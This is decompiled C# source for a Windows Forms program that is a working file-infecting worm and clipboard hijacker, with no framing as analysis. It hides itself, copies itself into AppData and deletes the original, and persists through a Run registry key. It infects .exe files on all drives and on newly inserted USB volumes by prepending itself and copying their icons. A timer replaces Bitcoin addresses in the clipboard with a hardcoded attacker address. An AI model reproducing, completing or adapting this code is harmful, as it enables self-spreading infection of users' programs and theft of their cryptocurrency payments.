using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using ChangeIcon;
using MainV.Properties;
using Microsoft.Win32;
using TsudaKageyu;

namespace WindowsFormsApplication1;

public class Form1 : Form
{
	public struct DEV_BROADCAST_VOLUME
	{
		public int dbcv_size;

		public int dbcv_devicetype;

		public int dbcv_reserved;

		public int dbcv_unitmask;
	}

	private const int WM_DEVICECHANGE = 537;

	private const int DBT_DEVICEARRIVAL = 32768;

	private const int DBT_DEVICEREMOVALCOMPLETE = 32772;

	private const int DBT_DEVTYPVOLUME = 2;

	private int MainVExeSize = 27136;

	private string newappname = "";

	private string newfilename = Application.get_ExecutablePath();

	private IContainer components;

	private Timer timer1;

	private Timer timer2;

	private Timer timer3;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

	public Form1()
	{
		InitializeComponent();
	}

	private void OnChanged(object sender, FileSystemEventArgs e)
	{
		InfectExe(e.FullPath);
	}

	private void ExtractBaseExe(string FullPath)
	{
		File.Copy(Application.get_ExecutablePath(), FullPath, overwrite: true);
	}

	private void InfectExe(string FullPath)
	{
		try
		{
			bool flag = false;
			using (FileStream fileStream = new FileStream(FullPath, FileMode.Open, FileAccess.Read))
			{
				byte[] array = new byte[5];
				fileStream.Seek(-3L, SeekOrigin.End);
				fileStream.Read(array, 0, 3);
				flag = array[0] != 10 || array[1] != 11 || array[2] != 12;
			}
			if (Path.GetFileName(FullPath)![0] == '.' || FullPath.IndexOf(Path.GetTempPath()) != -1 || FullPath.IndexOf(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) != -1)
			{
				flag = false;
			}
			if (flag)
			{
				Random random = new Random();
				string text = Path.GetTempPath();
				if (!text.EndsWith("\\"))
				{
					text += "\\";
				}
				text = text + random.Next(10000) + ".ico";
				ExtractIcon(FullPath, text);
				string text2 = Path.GetTempPath();
				if (!text2.EndsWith("\\"))
				{
					text2 += "\\";
				}
				text2 = text2 + random.Next(10000) + ".exe";
				ExtractBaseExe(text2);
				if (File.Exists(text))
				{
					IconInjector.InjectIcon(text2, text);
				}
				FileInfo fileInfo = new FileInfo(text2);
				int baseSize = (int)fileInfo.Length;
				AppendExe(text2, FullPath, baseSize);
				File.Delete(text);
				File.Delete(FullPath);
				File.Move(text2, FullPath);
				File.Delete(text2);
			}
		}
		catch
		{
		}
	}

	private void watch(string path)
	{
		try
		{
			FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
			fileSystemWatcher.Path = path;
			fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
			fileSystemWatcher.Filter = "*.exe";
			fileSystemWatcher.Changed += OnChanged;
			fileSystemWatcher.EnableRaisingEvents = true;
			fileSystemWatcher.IncludeSubdirectories = true;
		}
		catch
		{
		}
	}

	private void ExtractIcon(string exefilename, string iconfilename)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		try
		{
			Icon val = null;
			IconExtractor val2 = new IconExtractor(exefilename);
			val = val2.GetIcon(0);
			using FileStream fileStream = new FileStream(iconfilename, FileMode.Create);
			val.Save((Stream)fileStream);
			fileStream.Close();
		}
		catch
		{
		}
	}

	private void AppendExe(string basefilename, string srcfilename, int baseSize)
	{
		try
		{
			using FileStream fileStream = new FileStream(srcfilename, FileMode.Open, FileAccess.Read);
			using FileStream fileStream2 = new FileStream(basefilename, FileMode.Append, FileAccess.Write);
			byte[] array = new byte[256];
			int num = 255;
			while (num > 0)
			{
				int num2 = fileStream.Read(array, 0, num);
				if (num2 == 0)
				{
					break;
				}
				fileStream2.Write(array, 0, num2);
			}
			fileStream2.Write(BitConverter.GetBytes(baseSize), 0, 4);
			array[0] = 10;
			array[1] = 11;
			array[2] = 12;
			fileStream2.Write(array, 0, 3);
		}
		catch
		{
		}
	}

	private void ExtractFileToDir(string Path)
	{
		try
		{
			using FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read);
			fileStream.Seek(MainVExeSize, SeekOrigin.Begin);
			using FileStream fileStream2 = new FileStream(Path, FileMode.Create, FileAccess.Write);
			byte[] buffer = new byte[256];
			int num = 255;
			while (num > 0)
			{
				int num2 = fileStream.Read(buffer, 0, num);
				if (num2 < num)
				{
					num2 -= 7;
				}
				if (num2 > 0)
				{
					fileStream2.Write(buffer, 0, num2);
					continue;
				}
				break;
			}
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		bool flag = false;
		using (FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
		{
			byte[] array = new byte[5];
			fileStream.Seek(-3L, SeekOrigin.End);
			fileStream.Read(array, 0, 3);
			flag = array[0] == 10 && array[1] == 11 && array[2] == 12;
		}
		if (flag)
		{
			try
			{
				using (FileStream fileStream2 = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
				{
					byte[] array2 = new byte[5];
					fileStream2.Seek(-7L, SeekOrigin.End);
					fileStream2.Read(array2, 0, 4);
					MainVExeSize = BitConverter.ToInt32(array2, 0);
				}
				string text = Path.GetTempPath();
				if (!text.EndsWith("\\"))
				{
					text += "\\";
				}
				text += "zgokr00.exe";
				using (FileStream fileStream3 = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
				{
					byte[] buffer = new byte[MainVExeSize];
					int num = MainVExeSize;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = fileStream3.Read(buffer, num2, num);
						if (num3 == 0)
						{
							break;
						}
						num2 += num3;
						num -= num3;
					}
					num = MainVExeSize;
					using FileStream fileStream4 = new FileStream(text, FileMode.Create, FileAccess.Write);
					fileStream4.Write(buffer, 0, num);
				}
				try
				{
					IconInjector.RemoveIcon(text);
				}
				catch
				{
				}
				try
				{
					Process.Start(text);
				}
				catch
				{
				}
				newappname = "." + Path.GetFileNameWithoutExtension(newfilename);
				newfilename = newfilename.Replace(Path.GetFileName(newfilename), newappname + ".exe");
				ExtractFileToDir(newfilename);
				if (!File.Exists(newfilename))
				{
					Random random = new Random();
					newfilename = Path.GetTempPath();
					if (!newfilename.EndsWith("\\"))
					{
						newfilename += "\\";
					}
					newfilename = newfilename + random.Next(10000) + ".exe";
					ExtractFileToDir(newfilename);
				}
				try
				{
					File.SetAttributes(newfilename, File.GetAttributes(newfilename) | FileAttributes.Hidden);
				}
				catch
				{
				}
				try
				{
					Process.Start(newfilename);
				}
				catch
				{
				}
				timer3.set_Enabled(true);
				return;
			}
			catch
			{
				return;
			}
		}
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!text2.EndsWith("\\"))
		{
			text2 += "\\";
		}
		if (Application.get_ExecutablePath().IndexOf(text2) == -1)
		{
			if (!Directory.Exists(text2 + "Dibifu_9"))
			{
				Directory.CreateDirectory(text2 + "Dibifu_9");
				File.Copy(Application.get_ExecutablePath(), text2 + "Dibifu_9\\vshost32.exe", overwrite: true);
				string path = text2 + "Dibifu_9\\IconExtractor.dll";
				File.WriteAllBytes(path, Resources.IconExtractor);
				Process.Start(text2 + "Dibifu_9\\vshost32.exe");
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.FileName = "cmd.exe";
				Process.Start(processStartInfo);
				Application.Exit();
			}
			else
			{
				Application.Exit();
			}
			return;
		}
		string text3 = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ClpBtcn", "");
		if (text3.Length > 1)
		{
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ClpBtcn", "");
				File.Delete(text3);
			}
			catch
			{
			}
		}
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ScdBcd", Application.get_ExecutablePath());
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array3 = logicalDrives;
		foreach (string path2 in array3)
		{
			watch(path2);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Clipboard.ContainsText((TextDataFormat)0))
			{
				string text = Clipboard.GetText((TextDataFormat)0);
				Regex regex = new Regex("([13][a-km-zA-HJ-NP-Z1-9]{25,34})");
				string text2 = regex.Replace(text, "1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj");
				if (text2.IndexOf("1BQZKqdp2CV3QV5nUEsqSg1ygegLmqRygj") > -1)
				{
					Clipboard.SetText(text2, (TextDataFormat)0);
				}
			}
		}
		catch
		{
		}
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Process.GetProcessesByName(newappname).Length < 1)
			{
				File.Delete(newfilename);
				Application.Exit();
			}
		}
		catch
		{
		}
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
	}

	private void InfectDir(string sDir)
	{
		try
		{
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				InfectDir(sDir2);
			}
			string[] files = Directory.GetFiles(sDir, "*.exe");
			foreach (string fullPath in files)
			{
				InfectExe(fullPath);
			}
		}
		catch
		{
		}
	}

	protected override void WndProc(ref Message m)
	{
		try
		{
			if (((Message)(ref m)).get_Msg() == 537)
			{
				DEV_BROADCAST_VOLUME dEV_BROADCAST_VOLUME = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(((Message)(ref m)).get_LParam(), typeof(DEV_BROADCAST_VOLUME));
				if (((Message)(ref m)).get_WParam().ToInt32() == 32768 && dEV_BROADCAST_VOLUME.dbcv_devicetype == 2)
				{
					InfectDir(DriveMaskToLetter(dEV_BROADCAST_VOLUME.dbcv_unitmask) + ":\\");
				}
				if (((Message)(ref m)).get_WParam().ToInt32() != 32772)
				{
				}
			}
			((Form)this).WndProc(ref m);
		}
		catch
		{
		}
	}

	private static char DriveMaskToLetter(int mask)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		int num = 0;
		int num2 = mask / 2;
		while (num2 != 0)
		{
			num2 /= 2;
			num++;
		}
		if (num < text.Length)
		{
			return text[num];
		}
		return '?';
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		timer3 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.set_Interval(3000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.set_Enabled(true);
		timer2.set_Interval(5000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		timer3.set_Interval(3000);
		timer3.add_Tick((EventHandler)timer3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
